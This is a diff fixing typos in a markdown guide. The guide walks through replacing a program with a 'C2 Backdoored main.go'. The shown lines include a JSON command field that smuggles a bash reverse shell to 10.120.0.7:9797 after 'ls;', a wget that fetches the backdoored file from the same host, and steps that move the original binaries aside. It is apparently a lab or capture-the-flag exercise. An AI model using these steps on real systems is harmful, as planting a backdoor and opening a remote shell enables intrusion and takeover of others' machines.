@@ -7,7 +7,7 @@
 go version
 # go version go1.18.1 linux/amd64
 ```
-4. Just Chabge `command` in [🗂 C2 Backdoored main.go](./04-main.go) Line: 107
+4. Just Change `command` in [🗂 C2 Backdoored main.go](./04-main.go) Line: 107
 ```
 ... {"flag": flag_data, "command": "ls;/bin/bash -i >& /dev/tcp/10.120.0.7/9797 0>&1;"}
 ```
@@ -17,7 +17,7 @@ go version
 ```
 wget "http://10.120.0.7:8000/04-main.go"
 ```
-8. Make a Backup of Old Files
+8. Make Backup of Old Files
 ```
 mv main.go main.back.go
 mv main main.bak
